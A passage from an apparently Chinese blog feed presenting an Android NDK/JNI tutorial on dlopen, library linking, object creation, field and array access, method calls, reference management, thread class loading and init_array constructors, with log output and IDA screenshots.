查找库里某个函数或变量的地址；</li><li><code>handle</code> 是 <code>dlopen</code> 返回的句柄；</li><li><code>&quot;TestMain&quot;</code> 是你要调用的函数名（必须是 <code>extern &quot;C&quot;</code> 的，否则 C++ 会有 name mangling）；</li><li>返回的是一个 <code>void*</code>，所以你必须把它 <strong>强制转换为函数指针</strong>，这里是 <code>TestMainFunc</code>。</li></ul><p>查看日志</p><pre><code class="language-shell">2025-08-15 15:35:20.852  8466-8466  NshIdE                  com.example.javaandnative            D  This is TestMain for many cpp</code></pre><hr><p>另一种方法就是通过 link so 实现</p><p>首先修改 CMakeLists.txt </p><pre><code># 先编译 nshideadd_library(nshide SHARED        NshIdE.cpp)target_link_libraries(nshide        android        log)# 再编译 javaandnative，链接 nshideadd_library($&#123;CMAKE_PROJECT_NAME&#125; SHARED        # List C/C++ source files with relative paths to this CMakeLists.txt.        native-lib.cpp)target_link_libraries($&#123;CMAKE_PROJECT_NAME&#125;        # List libraries link to the target library        nshide        android        log)</code></pre><p>因为<code>javaandnative</code> 要依赖 <code>nshide</code>，所以必须在 <code>target_link_libraries</code> 里先声明；函数名必须是 extern “C”，否则链接器找不到函数。</p><p>然后在另一个 so 中直接调用即可</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#include &quot;dlfcn.h&quot;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);JavaVM* global_vm;// 声明另一个文件里的函数extern &quot;C&quot; void TestMain(JNIEnv* env);extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    return env-&gt;NewStringUTF(hello.c_str());&#125;jstring FunctionTest(JNIEnv* env, jobject thiz, int a, jstring b, jbyteArray c) &#123;    return env-&gt;NewStringUTF(&quot;This is FunctionTest&quot;);&#125;void callTestMain(JNIEnv* env) &#123;    TestMain(env);&#125;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserver) &#123;    global_vm = vm;    JNIEnv *env = nullptr;    if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;        LOGI(&quot;GetEnv failed&quot;);        return -1;    &#125;    jclass MainActivityClazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    JNINativeMethod methods[] = &#123;            &#123;&quot;stringFromJNI1&quot;, &quot;(ILjava/lang/String;[B)Ljava/lang/String;&quot;, (void *)FunctionTest&#125;    &#125;;    env-&gt;RegisterNatives(MainActivityClazz, methods, sizeof(methods) / sizeof(JNINativeMethod));    callTestMain(env);    return JNI_VERSION_1_6;&#125;</code></pre><p>下面是另一个 cpp 文件的内容</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);extern &quot;C&quot; void TestMain(JNIEnv* env) &#123;    LOGD(&quot;This is TestMain for many cpp&quot;);&#125;</code></pre><p>然后 build 该 demo，可以看到<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250815160527944.png" alt="image-20250815160527944"></p><p>日志中也同样输出了</p><pre><code class="language-shell">2025-08-15 15:56:13.246 16210-16210 NshIdE                  com.example.javaandnative            D  This is TestMain for many cpp</code></pre><h3 id="十三、通过-JNI-创建-Java-对象"><a href="#十三、通过-JNI-创建-Java-对象" class="headerlink" title="十三、通过 JNI 创建 Java 对象"></a>十三、通过 JNI 创建 Java 对象</h3><p>有以下几种方法可以实现</p><ul><li><strong>NewObject 创建对象</strong></li></ul><pre><code class="language-c++">jclass clazz = env-&gt;FindClass(&quot;com/example/javaandnative/MyClass&quot;);jmethodID ctor = env-&gt;GetMethodID(clazz, &quot;&lt;init&gt;&quot;, &quot;()V&quot;); // 无参构造jobject obj = env-&gt;NewObject(clazz, ctor);//可选：调用对象方法jmethodID method = env-&gt;GetMethodID(clazz, &quot;someMethod&quot;, &quot;(I)V&quot;);env-&gt;CallVoidMethod(obj, method, 123);</code></pre><p>这种方法最直接，推荐在知道构造函数的情况下使用。</p><hr><pre><code class="language-c++">jclass classClass = env-&gt;FindClass(&quot;java/lang/Class&quot;);jmethodID forName = env-&gt;GetStaticMethodID(classClass, &quot;forName&quot;, &quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;);jstring className = env-&gt;NewStringUTF(&quot;com.example.javaandnative.MyClass&quot;);jclass clazz = (jclass) env-&gt;CallStaticObjectMethod(classClass, forName, className);jmethodID ctor = env-&gt;GetMethodID(clazz, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);jobject obj = env-&gt;NewObject(clazz, ctor);</code></pre><p>这种方法适合 <strong>动态类名</strong> 或不确定类时使用，但比直接 <strong>FindClass</strong> 慢一些。</p><ul><li><strong>AllocObject 创建对象</strong></li></ul><pre><code class="language-c++">jclass clazz = env-&gt;FindClass(&quot;com.example.javaandnative.MyClass&quot;);jmethodID methodID = env-&gt;GetMethodID(clazz, &quot;&lt;init&gt;&quot;, &quot;(Ljava/lang/String;I)V&quot;);jobject ReflectDemoObj = env-&gt;AllocObject(clazz);jstring jstr = env-&gt;NewStringUTF(&quot;from jni str&quot;);env-&gt;CallNonvirtualVoidMethod(ReflectDemoObj, clazz, methodID, jstr, 100);</code></pre><p><strong>AllocObject</strong>：只分配对象，不调用构造函数；<br><strong>CallNonvirtualVoidMethod</strong>：在空对象上调用 <code>&lt;init&gt;</code>，手动执行构造函数；<br>两步组合 &#x3D; “手动版 NewObject”。</p><h3 id="十四、通过-JNI-访问-Java-属性"><a href="#十四、通过-JNI-访问-Java-属性" class="headerlink" title="十四、通过 JNI 访问 Java 属性"></a>十四、通过 JNI 访问 Java 属性</h3><h4 id="14-1-获取静态字段"><a href="#14-1-获取静态字段" class="headerlink" title="14.1 获取静态字段"></a>14.1 获取静态字段</h4><p>1、先调用获取静态字段 ID 的方法：GetStaticFieldID</p><pre><code class="language-c++">jclass clazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    jfieldID privateStaticStringField =            env-&gt;GetStaticFieldID(clazz, &quot;privateStaticStringField&quot;, &quot;Ljava/lang/String;&quot;);</code></pre><p>2、根据字段属性选择对应的 Get 方法</p><pre><code class="language-c++">// env-&gt;GetStaticBooleanField();// env-&gt;GetStaticIntField();// env-&gt;GetStaticShortField();// env-&gt;GetStaticByteField();// env-&gt;GetStaticCharField();// env-&gt;GetStaticFloatField();// env-&gt;GetStaticDoubleField();// env-&gt;GetStaticLongField();// env-&gt;GetStaticObjectField();</code></pre><p>上面代码中的 <strong>privateStaticStringField</strong> 是 String 类型，其实也就是 Object，所以选择 env-&gt;GetStaticObjectField()</p><p>3、获取 jstring 的静态字段 privateStaticString</p><pre><code class="language-c++">jclass clazz = env-&gt;FindClass(&quot;com/example/NshIdE/NDKDemo&quot;);jstring privateStaticString =static_cast&lt;jstring&gt;(env-&gt;GetStaticObjectField(clazz, privateStaticStringField));</code></pre><p>这里把 object 强制转换为 jstring 类型。</p><p>4、由于所处位置为 so 层，所以要转化成 C&#x2F;C++ 语言类型</p><pre><code class="language-c++">const char* privateStr =            env-&gt;GetStringUTFChars(privateStaticString, nullptr);</code></pre><p>5、以日志的形式打印</p><pre><code class="language-c++">LOGD(&quot;privateStaticString(Old): %s&quot;, privateStr);</code></pre><p>6、释放</p><pre><code class="language-c++">env-&gt;ReleaseStringUTFChars(privateStaticString, privateStr);</code></pre><p>日志输出</p><pre><code class="language-shell">2025-08-15 17:34:03.544 28911-28911 NshIdE                  com.example.javaandnative            D  privateStaticString(Old): this is privateStaticStringField</code></pre><hr><h4 id="14-2-获取对象字段"><a href="#14-2-获取对象字段" class="headerlink" title="14.2 获取对象字段"></a>14.2 获取对象字段</h4><p>1、先获取 FieldId</p><pre><code class="language-c++">jclass clazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    jfieldID publicStringField =            env-&gt;GetFieldID(clazz, &quot;publicStringField&quot;, &quot;Ljava/lang/String;&quot;);</code></pre><p>2、获取 jstring</p><pre><code>jmethodID methodID = env-&gt;GetMethodID(clazz, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);jobject ReflectDemoObj = env-&gt;NewObject(clazz, methodID);jstring publicString =static_cast&lt;jstring&gt;(env-&gt;GetObjectField(ReflectDemoObj, publicStringField));</code></pre><p>由于我们获取的是对象字段，所以一定要有一个对象，因此 GetObjectField 的第一个参数是对象。</p><p>3、转化为 C&#x2F;C++ 字符串</p><pre><code class="language-c++">const char* publicStr =            env-&gt;GetStringUTFChars(publicString, nullptr);</code></pre><p>4、以日志的形式打印输出</p><pre><code class="language-c++">LOGD(&quot;publicStringField: %s&quot;, publicStr);</code></pre><p>5、对字符串进行释放</p><pre><code class="language-c++">env-&gt;ReleaseStringUTFChars(publicString, publicStr);</code></pre><p>日志输出</p><pre><code class="language-shell">2025-08-15 17:43:37.710 31635-31635 NshIdE                  com.example.javaandnative            D  publicStringField: this is publicStringField</code></pre><hr><h4 id="14-3-设置对象字段"><a href="#14-3-设置对象字段" class="headerlink" title="14.3 设置对象字段"></a>14.3 设置对象字段</h4><p>通过 <strong>SetObjectField</strong> 就行了，第一个参数是对象，第二个参数是字段 ID，第三个参数是要修改的值</p><pre><code class="language-c++">env-&gt;SetObjectField(ReflectDemoObj, privateStringFieldID, env-&gt;NewStringUTF(&quot;NshIdE&quot;));</code></pre><p>进行修改前后的对比</p><pre><code class="language-c++">void setOobjectField(JNIEnv* env) &#123;    jclass clazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    jmethodID methodId = env-&gt;GetMethodID(clazz, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);    jfieldID privateStringField =            env-&gt;GetFieldID(clazz, &quot;privateStringField&quot;, &quot;Ljava/lang/String;&quot;);    jobject obj = env-&gt;NewObject(clazz, methodId);    jstring privateString = static_cast&lt;jstring&gt;(env-&gt;GetObjectField(obj, privateStringField));    const char* privateStr =            env-&gt;GetStringUTFChars(privateString, nullptr);    LOGD(&quot;privateStringField(Old): %s&quot;, privateStr);    env-&gt;ReleaseStringUTFChars(privateString, privateStr);    env-&gt;SetObjectField(obj, privateStringField, env-&gt;NewStringUTF(&quot;NshIdE&quot;));    privateString = static_cast&lt;jstring&gt;(env-&gt;GetObjectField(obj, privateStringField));    privateStr = env-&gt;GetStringUTFChars(privateString, nullptr);    LOGD(&quot;privateStringField(New): %s&quot;, privateStr);    env-&gt;ReleaseStringUTFChars(privateString, privateStr);&#125;</code></pre><p>日志输出</p><pre><code class="language-shell">2025-08-15 17:55:37.896  3564-3564  NshIdE                  com.example.javaandnative            D  privateStringField(Old): this is privateStaticStringField2025-08-15 17:55:37.896  3564-3564  NshIdE                  com.example.javaandnative            D  privateStringField(New): NshIdE</code></pre><p>同时我们也确定了不管是 public 还是 private 我们都能<strong>获取</strong>或<strong>修改</strong>。</p><h3 id="十五、通过JNI访问和修改Java数组"><a href="#十五、通过JNI访问和修改Java数组" class="headerlink" title="十五、通过JNI访问和修改Java数组"></a>十五、通过JNI访问和修改Java数组</h3><p>具体操作详见下面代码，整体的思路和字符对象是一样的。</p><pre><code class="language-c++">void visitByteArray(JNIEnv* env) &#123;    jclass clazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);    jmethodID methodId = env-&gt;GetMethodID(clazz, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);    jobject obj = env-&gt;NewObject(clazz, methodId);    // 获取 byte 数组的字段 ID    jfieldID byteArrayField =            env-&gt;GetFieldID(clazz, &quot;byteArrayField&quot;, &quot;[B&quot;);    jbyteArray byteArray = static_cast&lt;jbyteArray&gt;(env-&gt;GetObjectField(obj, byteArrayField));    int length = env-&gt;GetArrayLength(byteArray);    char *CByteArray = reinterpret_cast&lt;char *&gt;(env-&gt;GetByteArrayElements(byteArray, nullptr));    for (int i = 0; i &lt; length; i++) &#123;        LOGD(&quot;CByteArray(Old): %d&quot;, CByteArray[i]);    &#125;    // 在 C++ 中新建一个 char 类型的数组 cByteArray，并且为其赋值    char cByteArray[length];    for (int i = 0; i &lt; length; i++) &#123;        cByteArray[i] = static_cast&lt;char&gt;(100 - i);    &#125;    // 将 cByteArray 中的元素转换成 jbyte 类型的数组    const jbyte* java_array = reinterpret_cast&lt;const jbyte*&gt;(cByteArray);    // 使用 SetByteArrayRegion 函数将 Java 数组元素设置为 cByteArray 中的元素    env-&gt;SetByteArrayRegion(byteArray, 0, length, java_array);    length = env-&gt;GetArrayLength(byteArray);    CByteArray = reinterpret_cast&lt;char *&gt;(env-&gt;GetByteArrayElements(byteArray, nullptr));    for (int i = 0; i &lt; length; i++) &#123;        LOGD(&quot;CByteArray(New): %d&quot;, CByteArray[i]);    &#125;    env-&gt;ReleaseByteArrayElements(byteArray, reinterpret_cast&lt;jbyte *&gt;(CByteArray), 0);&#125;</code></pre><p>运行，查看日志输出</p><pre><code class="language-shell">2025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(Old): 12025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(Old): 22025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(Old): 32025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(Old): 42025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(Old): 52025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(New): 1002025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(New): 992025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(New): 982025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(New): 972025-08-18 10:27:30.356 27817-27817 NshIdE                  com.example.javaandnative            D  CByteArray(New): 96</code></pre><h3 id="十六、通过-JNI-访问-Java-方法"><a href="#十六、通过-JNI-访问-Java-方法" class="headerlink" title="十六、通过 JNI 访问 Java 方法"></a>十六、通过 JNI 访问 Java 方法</h3><h4 id="1、调用静态函数"><a href="#1、调用静态函数" class="headerlink" title="1、调用静态函数"></a>1、调用静态函数</h4><pre><code class="language-c++">// env-&gt;CallBooleanMethod();// env-&gt;CallVoidMethod();// env-&gt;CallByteMethod();// env-&gt;CallShortMethod();// env-&gt;CallIntMethod();// env-&gt;CallCharMethod();// env-&gt;CallDoubleMethod();// env-&gt;CallLongMethod();// env-&gt;CallFloatMethod();// env-&gt;CallObjectMethod();jmethodID publicStaticFuncID =env-&gt;GetStaticMethodID(clazz, &quot;publicStaticFunc&quot;, &quot;()V&quot;);env-&gt;CallStaticVoidMethod(clazz, publicStaticFuncID);</code></pre><p>静态方法很简单，只要调用 CallStaticVoidMethod 就行了。</p><hr><h4 id="2、调用对象函数"><a href="#2、调用对象函数" class="headerlink" title="2、调用对象函数"></a>2、调用对象函数</h4><pre><code class="language-c++">jmethodID privateFuncID =env-&gt;GetMethodID(clazz,&quot;privateFunc&quot;,&quot;(Ljava/lang/String;I)Ljava/lang/String;&quot;);jstring str1 = env-&gt;NewStringUTF(&quot;this is from JNI&quot;);jstring retval_jstring = static_cast&lt;jstring&gt;(env-&gt;CallObjectMethod(Obj, privateFuncID, str1, 1000));const char* retval_cstr = env-&gt;GetStringUTFChars(retval_jstring, nullptr);LOGD(&quot;privateStaticString: %s&quot;, retval_cstr);env-&gt;ReleaseStringUTFChars(retval_jstring, retval_cstr);</code></pre><p>既然是对象函数，那再调用前自然要先 new 一个对象，然后再调用，再将返回的字符串进行类型转换，即可在日志中输出。</p><h3 id="十七、CallVoidMethod、A、V-版本的区别"><a href="#十七、CallVoidMethod、A、V-版本的区别" class="headerlink" title="十七、CallVoidMethod、A、V 版本的区别"></a>十七、CallVoidMethod、A、V 版本的区别</h3><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818103947271.png" alt="image-20250818103947271"></p><p>可以看到 <strong>CallVoidMethod</strong> 底层调用的是 <strong>CallVoidMethodV</strong>，他们两个的区别在于 CallVoidMethod 会帮我们封装参数，而 CallVoidMethodV 需要我们自己封装参数，可以看成它只能有一个参数。而对于 <strong>CallVoidMethodA</strong>，它的参数是 jvalue*。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818104808092.png" alt="image-20250818104808092"></p><p>jvalue* 是一个嵌合体</p><pre><code class="language-c++">jmethodID privateFuncID =env-&gt;GetMethodID(clazz,&quot;privateFunc&quot;,&quot;(Ljava/lang/String;I)Ljava/lang/String;&quot;);jstring str2 = env-&gt;NewStringUTF(&quot;this is from JNI2&quot;);jvalue args[2];args[0].l = str2;args[1].i = 1000;jstring retval = static_cast&lt;jstring&gt;(env-&gt;CallObjectMethodA(Obj, privateFuncID, args));const char* cpp_retval = env-&gt;GetStringUTFChars(retval, nullptr);LOGD(&quot;cpp_retval: %s&quot;, cpp_retval);env-&gt;ReleaseStringUTFChars(retval, cpp_retval);</code></pre><p>通过往 jvalue 里放参数，然后进行调用。</p><p>总结一下：</p><ul><li><strong>CallVoidMethod（可变参数）</strong>：虽然写法上是 <code>...</code>，但 <strong>编译期必须知道参数个数和类型</strong>，不能动态改变。</li><li><strong>CallVoidMethodA（jvalue 数组）</strong>：可以在运行时决定数组长度和每个参数的类型，因此 <strong>参数个数和类型可以动态变化</strong>。</li></ul><h3 id="十八、内存管理"><a href="#十八、内存管理" class="headerlink" title="十八、内存管理"></a>十八、内存管理</h3><h4 id="1、局部引用"><a href="#1、局部引用" class="headerlink" title="1、局部引用"></a>1、局部引用</h4><ul><li>大多数的 JNI 函数，调用以后返回的结果都是局部引用，因此，<strong>env-&gt;NewLocalRef</strong> 基本不用；</li><li>一个函数内的局部引用数量是有限的，在早期的安卓系统中，体现的更为明显；</li><li>当函数体内需要大量使用局部引用时，比如大循环中，最好及时删除不用的局部引用，可以使用 <strong>env-&gt;DeleteLocalRef</strong> 来删除局部引用；</li><li>局部引用和局部变量不同</li></ul><table><thead><tr><th>方面</th><th>局部变量</th><th>局部引用（JNI）</th></tr></thead><tbody><tr><td>所在位置</td><td>C&#x2F;C++ 栈</td><td>JVM 管理的引用（在栈上存放引用）</td></tr><tr><td>生命周期</td><td>函数作用域</td><td>默认 native 方法结束自动释放，可手动删除</td></tr><tr><td>管理方式</td><td>自动释放</td><td>由 JVM 管理，可能需要手动释放</td></tr><tr><td>指向对象</td><td>本地值或对象</td><td>JVM 中的 Java 对象</td></tr><tr><td>可能问题</td><td>内存安全由语言管理</td><td>如果超过作用域或循环不释放，可能导致局部引用表溢出</td></tr></tbody></table><hr><h4 id="2、局部引用相关的其他函数"><a href="#2、局部引用相关的其他函数" class="headerlink" title="2、局部引用相关的其他函数"></a>2、局部引用相关的其他函数</h4><p><strong>env-&gt;EnsureLocalCapacity(num)</strong> 用于判断是否有足够的局部引用可以使用，足够则返回 0，需要大量使用局部引用时，手动删除太过麻烦，可以使用以下两个函数来批量管理局部引用</p><blockquote><p>env-&gt;PushLocalFrame(num)</p><p>env-&gt;PopLocalFrame(nullptr)</p></blockquote><p>示例代码</p><pre><code class="language-c++">env-&gt;PushLocalFrame(100);if(env-&gt;EnsureLocalCapacity(100) == 0) &#123;for(int i = 0; i &lt; 3; i++)&#123;jstring tempString = env-&gt;NewStringUTF(&quot;NshIdE&quot;);env-&gt;SetObjectArrayElement(_jstringArray, i, tempString);//env-&gt;DeleteLocalRef(tempString);sleep(1);LOGD(&quot;env-&gt;EnsureLocalCapacity&quot;);&#125;&#125;env-&gt;PopLocalFrame(nullptr);</code></pre><hr><h4 id="3、全局引用"><a href="#3、全局引用" class="headerlink" title="3、全局引用"></a>3、全局引用</h4><p>在 JNI 开发中，需要跨函数使用变量时，直接定义全局变量时没有用的，需要使用以下两个方法，来创建和删除全局引用。</p><blockquote><p>env-&gt;NewGlobalRef()</p><p>env-&gt;DeleteGlobalRef()</p></blockquote><pre><code class="language-c++">jobject g_obj;void saveGlobalRef(JNIEnv* env, jobject obj) &#123;    g_obj = env-&gt;NewGlobalRef(obj);  // 创建全局引用&#125;void releaseGlobalRef(JNIEnv* env) &#123;    env-&gt;DeleteGlobalRef(g_obj);&#125;</code></pre><p>为什么不能直接定义全局变量，原因也还是和前面说的一个点有关：</p><ul><li>JNIEnv* 是 <strong>线程私有的指针</strong>，每个线程都有自己的 JNIEnv*；</li><li>不能在一个线程里拿到的 <strong>JNIEnv</strong>* 放到全局变量里，然后在另一个线程使用</li></ul><hr><h4 id="4、弱全局引用"><a href="#4、弱全局引用" class="headerlink" title="4、弱全局引用"></a>4、弱全局引用</h4><p>与全局引用基本相同，区别是弱全局引用有可能会被回收</p><blockquote><p>env-&gt;NewWeakGlobalRef()</p><p>env-&gt;DeleteWeakGlobalRef()</p></blockquote><table><thead><tr><th>特性</th><th>全局引用 (GlobalRef)</th><th>弱全局引用 (WeakGlobalRef)</th></tr></thead><tbody><tr><td>跨函数&#x2F;线程</td><td>可以</td><td>可以</td></tr><tr><td>阻止垃圾回收</td><td>会</td><td>不会</td></tr><tr><td>必须手动释放</td><td>是</td><td>是</td></tr><tr><td>使用前需检查是否有效</td><td>不需要</td><td>需要 <code>NewLocalRef</code> 检查</td></tr><tr><td>使用场景</td><td>跨线程回调、长期保存对象</td><td>缓存、观察者、弱引用容器</td></tr></tbody></table><h3 id="十九、子线程中获取-Java-类"><a href="#十九、子线程中获取-Java-类" class="headerlink" title="十九、子线程中获取 Java 类"></a>十九、子线程中获取 Java 类</h3><p>1、在子线程中，<strong>findClass</strong> 可以直接获取 <strong>系统类</strong>。注意强调是 系统类。</p><pre><code class="language-c++">jclass ClassLoaderClazz = env-&gt;FindClass(&quot;java/lang/ClassLoader&quot;);LOGD(&quot;myThread ClassLoaderClazz: %p&quot;, ClassLoaderClazz);jclass StringClasszz=env-&gt;FindClass(&quot;java/lang/String&quot;);LOGD(&quot;myThread StringClasszz: %p&quot;, StringClasszz);</code></pre><hr><p>2、在主线程中获取类，使用全局引用来传递到子线程中</p><pre><code class="language-c++">jclass MainActivityClazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);globalClass= static_cast&lt;jclass&gt;(env-&gt;NewGlobalRef(MainActivityClazz));子线程中调用LOGD(&quot;myThread globalClass: %p&quot;, globalClass);</code></pre><hr><p>3、在主线程中获取正确的 <strong>ClassLoader</strong>，在子线程中去加载类</p><p>在 Java 中，可以先获取<strong>类字节码</strong>，然后使用 getClassLoader() 来获取 ClassLoader</p><pre><code class="language-Java">Demo.class.getClassLoader()new Demo().getClass().getClassLoader()Class.forName(...).getClassLoader()</code></pre><p>在 native 层进行转换，获取 ClassLoader</p><pre><code class="language-c++">//MainActivity.class.getClassLoaderjclass MainActivityClazz = env-&gt;FindClass(&quot;com/example/javaandnative/MainActivity&quot;);jclass classClasszz=env-&gt;FindClass(&quot;java/lang/Class&quot;);jmethodID getClassLoaderMethoid=env-&gt;GetMethodID(classClasszz,&quot;getClassLoader&quot;, &quot;()Ljava/lang/ClassLoader;&quot;);jobject tempClassLoader = env-&gt;CallObjectMethod(MainActivityClazz,getClassLoaderMethoid);globalClassLoader=env-&gt;NewGlobalRef(tempClassLoader);</code></pre><p>在 JNI 的子线程中 loadClass</p><pre><code class="language-c++">//jclass MainActivityClasszz=FindClass(&quot;com/example/javaandso/MainActivity&quot;)jclass LoadClassClazz=env-&gt;FindClass(&quot;java/lang/ClassLoader&quot;);jmethodID LoadClassmMethoid=env-&gt;GetMethodID(LoadClassClazz,&quot;loadClass&quot;, &quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;);jclass MainActivityClasszz= static_cast&lt;jclass&gt;(env-&gt;CallObjectMethod(globalClassLoader,LoadClassmMethoid,env-&gt;NewStringUTF(&quot;com.example.javaandso.MainActivity&quot;)));</code></pre><p>我们要得到的MainActivityClasszz其实在主线程已经获取过一次了，所以第三种方法其实有点麻烦，不如第二种使用全局引用。</p><h3 id="二十、init-与-initarray"><a href="#二十、init-与-initarray" class="headerlink" title="二十、init 与 initarray"></a>二十、init 与 initarray</h3><p>1、SO 在执行 <strong>JNI_OnLoad</strong> 之前，还会执行两个构造函数 init、initarray</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818140832715.png" alt="image-20250818140832715"></p><p>2、so 加固、so 中字符串加密等等，一般都会把相关代码放到这里，所以 JNI_OnLoad 的时候一般 so 是已经被解密了</p><p>3、init 的使用</p><pre><code class="language-c++">extern &quot;C&quot; void _init()&#123; //函数名必须为_initLOGD(&quot;_init &quot;);&#125;</code></pre><p>4、initarray 的使用</p><pre><code class="language-c++">__attribute__ ((constructor)) void initArrayTest3()&#123;LOGD(&quot;initArrayTest3&quot;);&#125;__attribute__ ((constructor)) void initArrayTest1()&#123;LOGD(&quot;initArrayTest1 &quot;);&#125;__attribute__ ((constructor)) void initArrayTest2()&#123;LOGD(&quot;initArrayTest2 &quot;);&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818115630833.png" alt="image-20250818115630833"></p><p>可以看到如果不加任何修饰，会按照我们代码写的顺序执行。</p><p>而如果加了，constructor 后面的值，较小的先执行，最好从100以后开始用。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818115810380.png" alt="image-20250818115810380"></p><p>然而对于有的有值有的没值的情况，则先执行有值的顺序，再执行没值的顺序</p><pre><code class="language-c++">__attribute__ ((constructor(101))) void initArrayTest3()&#123;LOGD(&quot;initArrayTest3&quot;);&#125;__attribute__ ((constructor)) void initArrayTest5()&#123;LOGD(&quot;initArrayTest5&quot;);&#125;__attribute__ ((constructor(303))) void initArrayTest1()&#123;LOGD(&quot;initArrayTest1 &quot;);&#125;__attribute__ ((constructor)) void initArrayTest2()&#123;LOGD(&quot;initArrayTest2 &quot;);&#125;__attribute__ ((constructor(202))) void initArrayTest4()&#123;LOGD(&quot;initArrayTest4&quot;);&#125;</code></pre><p>执行的日志结果</p><pre><code class="language-shell">2025-08-18 12:00:41.019  1072-1072  NshIdE                  com.example.javaandnative            D  initArrayTest32025-08-18 12:00:41.019  1072-1072  NshIdE                  com.example.javaandnative            D  initArrayTest42025-08-18 12:00:41.019  1072-1072  NshIdE                  com.example.javaandnative            D  initArrayTest1 2025-08-18 12:00:41.019  1072-1072  NshIdE                  com.example.javaandnative            D  initArrayTest52025-08-18 12:00:41.019  1072-1072  NshIdE                  com.example.javaandnative            D  initArrayTest2 </code></pre><p>如果再加上 visibility(“hidden”)，则会在反编译 so 时抹去 initArrayTest6 的符号</p><pre><code class="language-c++">__attribute__ ((constructor, visibility(&quot;hidden&quot;))) void initArrayTest6()&#123;LOGD(&quot;initArrayTest6&quot;);&#125;</code></pre><p>build一下，看反编译结果</p><h4 id="反编译-so"><a href="#反编译-so" class="headerlink" title="反编译 so"></a>反编译 so</h4><p><strong>_init</strong> 在 ida 反编译后为 <strong>.init_proc</strong></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818140955830.png" alt="image-20250818140955830"></p><p>然后通过段表，可以看到 <strong>init_array</strong> 段<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818141041371.png" alt="image-20250818141041371"></p><p>跟进看看<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818141137473.png" alt="image-20250818141137473"></p><p>可以看到已经排好顺序了，即这里所看到的顺序和真实执行的排序是一样的。并且这里的 <strong>sub_1D60C</strong> 函数就是 <strong>initArrayTest6</strong>，符号确实被去掉了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250818141328844.png" alt="image-20250818141328844"></p><h3 id="二十一、尾声"><a href="#二十一、尾声" class="headerlink" title="二十一、尾声"></a>二十一、尾声</h3><p>通过这篇文章，较为系统的学习了解了 关于Android NDK 方面的开发知识，不仅仅在开发时有用，在基本的 Android 逆向分析中，我们也能有一个良好的思考线路。</p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从实践中学习unidbg使用(六)</title>
      <link href="/2025/08/10/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E5%85%AD)/"/>
      <url>/2025/08/10/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E5%85%AD)/</url>
      
